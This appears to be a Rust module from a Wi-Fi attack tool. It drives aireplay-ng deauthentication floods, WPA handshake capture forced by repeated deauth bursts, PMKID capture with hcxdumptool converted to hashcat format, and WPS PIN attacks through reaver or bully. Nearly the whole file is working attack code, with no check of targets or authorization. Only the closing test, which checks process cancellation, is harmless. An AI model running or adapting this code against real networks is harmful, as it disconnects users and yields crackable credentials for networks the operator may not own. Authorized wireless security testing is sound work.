use std::sync::Arc;
use std::thread::JoinHandle;
use std::time::Duration;

use crate::events::Channel;
use crate::model::{now, LogEvent};
use crate::process::{self, ChildGuard};
use crate::wifi;

fn report_result(result: Result<(), String>, logs: &Channel<LogEvent>) {
    if let Err(message) = result {
        let _ = logs.send(LogEvent {
            level: "error".into(),
            message,
            timestamp: now(),
        });
    }
}

fn ensure_linux(what: &str) -> Result<(), String> {
    if wifi::platform() != wifi::Platform::Linux {
        return Err(format!(
            "{what} requires Linux with a compatible wireless chipset."
        ));
    }
    Ok(())
}

fn linux_tool(tool: &str) -> Result<(), String> {
    if wifi::platform() != wifi::Platform::Linux {
        return Err("Packet injection requires Linux.".into());
    }
    wifi::require(tool)
}

fn deauth_args(interface: &str, bssid: &str, client: Option<&str>, count: u32) -> Vec<String> {
    let mut args = vec![
        "--deauth".to_string(),
        count.to_string(),
        "-a".to_string(),
        bssid.to_string(),
    ];
    if let Some(c) = client {
        args.push("-c".to_string());
        args.push(c.to_string());
    }
    args.push(interface.to_string());
    args
}

/// Start a continuous deauth (count 0) in a worker thread, stoppable via the guard.
pub fn deauth_job(
    interface: String,
    bssid: String,
    client: Option<String>,
    count: u32,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    linux_tool("aireplay-ng")?;
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let args = deauth_args(&interface, &bssid, client.as_deref(), count);
        report_result(
            run_until_stopped("aireplay-ng", &args, &logs, guard2),
            &logs,
        );
    });
    Ok((guard, handle))
}

/// Spawn a tool and stream it until `guard` requests a stop, then reap it.
fn run_until_stopped(
    program: &str,
    args: &[String],
    logs: &Channel<LogEvent>,
    guard: Arc<ChildGuard>,
) -> Result<(), String> {
    let (tx, rx) = std::sync::mpsc::sync_channel::<String>(128);
    let mut child = process::spawn_logged(program, args, tx).map_err(|e| e.to_string())?;
    guard.set_pid(child.id());
    let result = loop {
        if guard.stop_requested() {
            break Ok(());
        }
        if let Some(status) = child.try_wait().map_err(|e| e.to_string())? {
            break if status.success() {
                Ok(())
            } else {
                Err(format!("{program} exited with {status}"))
            };
        }
        match rx.recv_timeout(Duration::from_millis(50)) {
            Ok(line) => {
                let _ = logs.send(LogEvent {
                    level: "info".into(),
                    message: line,
                    timestamp: now(),
                });
            }
            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {}
            Err(_) => std::thread::sleep(Duration::from_millis(50)),
        }
    };
    process::reap(&mut child);
    guard.set_pid(0);
    // Preserve trailing results without waiting indefinitely for inherited pipes.
    if !guard.stop_requested() {
        let deadline = std::time::Instant::now() + Duration::from_millis(200);
        while std::time::Instant::now() < deadline {
            match rx.recv_timeout(Duration::from_millis(20)) {
                Ok(line) => {
                    let _ = logs.send(LogEvent {
                        level: "info".into(),
                        message: line,
                        timestamp: now(),
                    });
                }
                Err(std::sync::mpsc::RecvTimeoutError::Timeout) => continue,
                Err(_) => break,
            }
        }
    }
    result
}

/// Capture a WPA handshake: targeted airodump plus periodic deauth bursts.
/// Completes when a handshake is seen or the guard is stopped.
pub fn capture_handshake(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("Handshake capture")?;
    wifi::require("airodump-ng")?;
    wifi::require("aireplay-ng")?;

    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let errors = logs.clone();
        report_result(
            run_handshake(interface, bssid, channel, prefix, logs, guard2),
            &errors,
        );
    });
    Ok((guard, handle))
}

fn run_handshake(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
    guard: Arc<ChildGuard>,
) -> Result<(), String> {
    let mut args = vec![interface.clone()];
    args.push("--bssid".to_string());
    args.push(bssid.clone());
    args.push("--channel".to_string());
    args.push(channel.to_string());
    args.push("-w".to_string());
    args.push(prefix.clone());
    args.push("--write-interval".to_string());
    args.push("1".to_string());

    let (tx, rx) = std::sync::mpsc::sync_channel::<String>(128);
    let mut child = process::spawn_logged("airodump-ng", &args, tx).map_err(|e| e.to_string())?;
    guard.set_pid(child.id());

    // Forward output, watching for the handshake notice.
    let handshake = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let hs = handshake.clone();
    let log_chan = logs.clone();
    let reader_done = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let reader_done2 = reader_done.clone();
    let reader = std::thread::spawn(move || {
        while !reader_done2.load(std::sync::atomic::Ordering::Relaxed) {
            let line = match rx.recv_timeout(Duration::from_millis(50)) {
                Ok(line) => line,
                Err(std::sync::mpsc::RecvTimeoutError::Timeout) => continue,
                Err(_) => break,
            };
            if line.contains("WPA handshake") {
                hs.store(true, std::sync::atomic::Ordering::SeqCst);
            }
            let _ = log_chan.send(LogEvent {
                level: "info".into(),
                message: line,
                timestamp: now(),
            });
        }
    });

    let cap_path = format!("{prefix}-01.cap");
    let mut attempts = 0u32;
    while !guard.stop_requested()
        && !handshake.load(std::sync::atomic::Ordering::SeqCst)
        && attempts < 40
    {
        // Kick a client to force a reconnection that exposes the handshake.
        if matches!(child.try_wait(), Ok(Some(_))) {
            break;
        }
        let _ = run_until_stopped(
            "aireplay-ng",
            &deauth_args(&interface, &bssid, None, 5),
            &logs,
            guard.clone(),
        );
        attempts += 1;
        for _ in 0..30 {
            if guard.stop_requested() || handshake.load(std::sync::atomic::Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_millis(100));
        }
    }

    process::reap(&mut child);
    guard.set_pid(0);
    reader_done.store(true, std::sync::atomic::Ordering::Relaxed);
    let _ = reader.join();

    let captured = handshake.load(std::sync::atomic::Ordering::SeqCst);
    let _ = logs.send(LogEvent {
        level: if captured {
            "success".into()
        } else {
            "warn".into()
        },
        message: if captured {
            format!("Handshake captured: {cap_path}")
        } else {
            format!("Handshake capture stopped (no handshake confirmed): {cap_path}")
        },
        timestamp: now(),
    });
    Ok(())
}

/// Capture a PMKID via hcxdumptool (optional — requires hcxdumptool + hcxpcapngtool).
pub fn capture_pmkid(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("PMKID capture")?;
    if process::which("hcxdumptool").is_none() {
        return Err("PMKID capture requires `hcxdumptool` (install hcxtools).".into());
    }
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let pcapng = format!("{prefix}.pcapng");
    let handle = std::thread::spawn(move || {
        let args = vec![
            "-i".to_string(),
            interface,
            "-c".to_string(),
            channel.to_string(),
            "-o".to_string(),
            pcapng.clone(),
            "--enable_status=1".to_string(),
            "--filtermode=2".to_string(),
            "--filtermac".to_string(),
            bssid,
        ];
        report_result(
            run_until_stopped("hcxdumptool", &args, &logs, guard2.clone()),
            &logs,
        );
        // Keep stop responsive; captures can be exported later from Captures.
        if guard2.stop_requested() {
            return;
        }
        // Convert to hashcat format if possible.
        if let Ok(out) = process::run_bounded(
            "hcxpcapngtool",
            &["-o", &format!("{prefix}.22000"), &pcapng],
        ) {
            let msg = String::from_utf8_lossy(&out.stdout).trim().to_string();
            let _ = logs.send(LogEvent {
                level: "info".into(),
                message: msg,
                timestamp: now(),
            });
        }
    });
    Ok((guard, handle))
}

/// Run a WPS attack via reaver (optional — requires reaver/bully).
pub fn wps_attack(
    interface: String,
    bssid: String,
    channel: i32,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("WPS attack")?;
    let tool = if process::which("reaver").is_some() {
        "reaver"
    } else if process::which("bully").is_some() {
        "bully"
    } else {
        return Err("WPS attack requires `reaver` or `bully`.".into());
    };
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let args = if tool == "reaver" {
            vec![
                "-i".to_string(),
                interface,
                "-b".to_string(),
                bssid,
                "-c".to_string(),
                channel.to_string(),
                "-vv".to_string(),
            ]
        } else {
            vec![
                interface,
                "-b".to_string(),
                bssid,
                "-c".to_string(),
                channel.to_string(),
                "-vv".to_string(),
            ]
        };
        report_result(run_until_stopped(tool, &args, &logs, guard2), &logs);
    });
    Ok((guard, handle))
}

#[cfg(test)]
mod lifecycle_tests {
    use super::*;
    #[test]
    fn silent_attack_process_can_be_cancelled_without_waiting_for_output() {
        let guard = ChildGuard::new();
        let worker_guard = guard.clone();
        let (tx, rx) = std::sync::mpsc::channel();
        let worker = std::thread::spawn(move || {
            #[cfg(target_os = "windows")]
            let (program, args) = (
                "powershell.exe",
                vec![
                    "-NoProfile".into(),
                    "-Command".into(),
                    "Start-Sleep -Seconds 30".into(),
                ],
            );
            #[cfg(not(target_os = "windows"))]
            let (program, args) = ("sleep", vec!["30".into()]);
            let logs = Channel::new(|_| Ok(()));
            let result = run_until_stopped(program, &args, &logs, worker_guard);
            tx.send(result).unwrap();
        });
        std::thread::sleep(Duration::from_millis(150));
        guard.request_stop();
        rx.recv_timeout(Duration::from_secs(4))
            .expect("Stop waited for silent output")
            .unwrap();
        worker.join().unwrap();
    }
}
